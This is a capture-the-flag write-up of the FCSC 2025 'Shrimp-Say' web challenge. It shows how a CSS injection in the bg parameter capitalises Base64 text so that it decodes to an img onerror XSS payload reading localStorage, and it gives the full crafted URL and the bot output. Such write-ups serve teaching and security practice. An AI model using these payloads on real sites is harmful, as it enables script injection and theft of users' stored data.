---
title: "Shrimp-Say [EN]| FCSC 2025"
date: 2025-04-26T12:00:00Z
description: "Here's a full writeup of the 'Shrimp-Say' web challenge created by Bitk at FCSC 2025."
tags: ["XSS"]
keywords: ["XSS"]
---
[//]: <> (Wrote By Vozec 27/04/2025)
---

# Introduction

The challenge presents us with a web application called "*shrimp-say*" and a bot service to interact with: 

- **Application Web**: [https://shrimp-say.fcsc.fr/](https://shrimp-say.fcsc.fr/)
- **Bot**: `nc chall.fcsc.fr 2203` *(No internet access)*

The web application allows users to manipulate two parameters, `msg` and `bg`, in its URL: 
```
https://shrimp-say.fcsc.fr/?msg=Hello%20Shrimp&bg=lightblue
```

These are reflected on the page: 
```html
<style>    
    body {
      background-color: lightblue;
    }
   ... 
</style>

...

<div class="speech-bubble">Hello Shrimp</div>
```

# Parameters Analysis 

- `msg`: This parameter undergoes filtering to prevent the inclusion of the **<** character, which could be used for HTML content injection.

```php
function redirect($msg, $bg)
{
  header("Location: /?msg=$msg&bg=$bg");
  die();
}

...

$msg = $_GET['msg'] ?? "Hello World";
...
if (strpos($msg, "<") !== false) {
  redirect("NO XSS", "red");
}
```

- `bg`:  Assigns a background color, but HTML encodes input, preventing straightforward XSS . However, it presents an opportunity for CSS injection.

```html
<head>
  <link rel="icon" href="data:,">
  <style>
    
    body {
      background-color: <?= htmlentities($bg) ?>;
    }
    
    ...
```

# Vulnerability Exploration 

The flag is stored in the local storage which quickly led me to conclude that javascript execution was required.  
```js
await page.evaluate((flag) => {
    localStorage.setItem("flag", flag);
  }, FLAG);
```

The application stores the `msg` parameter's *(filtered)* result as a Base64 encoded string within a `<script>` tag: 

Example
```html
<script type="text/base64" id="data">SGVsbG8gU2hyaW1w</script>
```

Later, JavaScript decodes this Base64 string and inserts the resultant HTML into a `<div>`: 
```js
document.querySelector(".speech-bubble").innerHTML = atob(document.getElementById('data').innerText);
```

A discrepancy lies in the use of    `text/base64` as a MIME type within the `<script>` tag. This MIME type is invalid per [MDN documentation](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/script/type) . Consequently, content within this tag isn't processed as JavaScript code but as a data block.

# CSS Exploitation 

Attempts to influence Base64 decoding directly were unsuccessful, as no character between 0 and 0x10FFFF decodes to `<` *(except for 0x3c)*. 

However, I discovered peculiar behavior with CSS transformations. Consider: 
```html
<div id="data" class="poc">abc</div>
<script>
console.log(atob(document.getElementById('data').innerText));
</script>
```
Output: `abc`

Adding CSS yields: 
```html
<style>
.poc {
  text-transform: uppercase;
}
</style>
<div id="data" class="poc">abc</div>
<script>
console.log(atob(document.getElementById('data').innerText));
</script>
```
Output: `ABC`

**CSS transformations affected the text content before decoding in JavaScript, suggesting an attack vector.** 

## Constructing the CSS Injection
By capitalizing only the first letter of the Base64 string `(text-transform: capitalize;)` and ensuring visibility `(display: block;)`, we influence the text transformation pre-decoding. 

CSS Injection Payload: 
```css
;}script{text-transform: capitalize;display: block;}
```

## Base64 Manipulation to Inject HTML 

Using PHP, I sought lowercase strings that, when capitalized, decode as `<im`.
```php
<?php
for ($i = 0x00; $i <= 0xFF; $i++) {
  for ($j = 0x00; $j <= 0xFF; $j++) {
    for ($k = 0x00; $k <= 0xFF; $k++) {
      if ($i === 0x3C || $j === 0x3C || $k === 0x3C) {
        continue;
      }
      $urlEncoded = sprintf("%%%02X%%%02X%%%02X", $i, $j, $k);
      $char = urldecode($urlEncoded);
      $b64 = base64_encode($char);
      $decoded = base64_decode(ucfirst($b64));

      if (strpos($decoded, '<im') !== false) {
        echo "Encoded: $b64, Decoded: $decoded\n";
      }
    }
  }
}
```

The script finds that `pGlt` transforms to `<im` after capitalization. (*PGlt*) 

Crafting a payload to inject JavaScript: 
```html
.img src/onerror=console.log(localStorage.getItem('flag'))>
```


The crafted URL for the bot interaction: 
```bash
http://shrimp-say/?msg=%a4%69%6d%67%2f%73%72%63%2f%6f%6e%65%72%72%6f%72%3d%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%6c%6f%63%61%6c%53%74%6f%72%61%67%65%2e%67%65%74%49%74%65%6d%28%27%66%6c%61%67%27%29%29%3e&bg==;}script{text-transform:%20capitalize;display:%20block;}
```

Leads to the following base64:
```
pGltZy9zcmMvb25lcnJvcj1jb25zb2xlLmxvZyhsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnZmxhZycpKT4mYmc9PTt9c2NyaXB0e3RleHQtdHJhbnNmb3JtOiBjYXBpdGFsaXplO2Rpc3BsYXk6IGJsb2NrO30=
```

After applying the css, the base64 becomes
```
PGltZy9zcmMvb25lcnJvcj1jb25zb2xlLmxvZyhsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnZmxhZycpKT4mYmc9PTt9c2NyaXB0e3RleHQtdHJhbnNmb3JtOiBjYXBpdGFsaXplO2Rpc3BsYXk6IGJsb2NrO30=
```

This leads to the following HTML code: 
```html
<img src/onerror=console.log(localStorage.getItem('flag'))>
```

# Flag

```bash
~/Desktop/tmp/FCSC » nc chall.fcsc.fr 2203
==========
Tips: Every console.log usage on the bot will be sent back to you :)
==========

Please provide the URL you want to visit:
http://shrimp-say/?msg=%a4%69%6d%67%2f%73%72%63%2f%6f%6e%65%72%72%6f%72%3d%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%6c%6f%63%61%6c%53%74%6f%72%61%67%65%2e%67%65%74%49%74%65%6d%28%27%66%6c%61%67%27%29%29%3e&bg==;}script{text-transform:%20capitalize;display:%20block;}

Starting the browser...
[T1]> New tab created!
[T1]> navigating        | about:blank

Setting the flag in the localStorage for http://shrimp-say/...
[T1]> navigating        | http://shrimp-say/?msg=Hello%20Shrimp&bg=lightblue

Going to the user provided link...
[T1]> navigating        | http://shrimp-say/?msg=%a4%69%6d%67%2f%73%72%63%2f%6f%6e%65%72%72%6f%72%3d%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%6c%6f%63%61%6c%53%74%6f%72%61%67%65%2e%67%65%74%49%74%65%6d%28%27%66%6c%61%67%27%29%29%3e&bg==;}script{text-transform:%20capitalize;display:%20block;}
[T1]> console.log       | FCSC{f6e865cb389605d91470af3b8555e4535463a1a56157c16c858fa8e9c5ff4513}

[ERROR] Invalid URL!
```

# Conclusion 
By leveraging CSS manipulation and an unconventional <script> tag handling, we circumvent client-side restrictions to execute stored JavaScript. This enables the bot to retrieve the flag, showcasing an intricate mix of PHP, CSS, and JS vulnerabilities.